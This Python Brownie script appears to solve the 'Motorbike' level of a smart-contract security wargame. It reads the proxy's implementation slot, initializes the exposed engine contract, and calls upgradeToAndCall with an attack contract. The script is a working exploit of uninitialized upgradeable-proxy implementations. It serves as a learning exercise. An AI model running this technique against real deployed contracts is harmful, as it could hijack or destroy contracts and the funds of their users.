from brownie import (
    network,
    accounts,
    config,
    interface,
    Contract,
    MotorbikeAttack,
)
from scripts.helpful_scripts import (
    get_account,
    get_new_instance,
    submit_instance,
    get_web3
)
from web3 import Web3


def main():
    player = get_account()
    instance_address = get_new_instance(level_id=25, player=player)
    w3 = get_web3()

    motorbike_contract = interface.IMotorbike(instance_address)
    attack_contract = MotorbikeAttack.deploy({"from": player})

    implementation_slot = Web3.toInt(hexstr="0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")
    engine_address = Web3.toHex(w3.eth.get_storage_at(instance_address, implementation_slot))
    engine_address = f'0x{engine_address[-40:]}'
    engine_contract = interface.IMotorbike(engine_address)

    tx = engine_contract.initialize({"from": player})
    tx.wait(1)

    tx_data = attack_contract.attack.encode_input()
    tx = engine_contract.upgradeToAndCall(attack_contract, tx_data, {"from": player})
    tx.wait(1)

    submit_instance(instance_address, player)
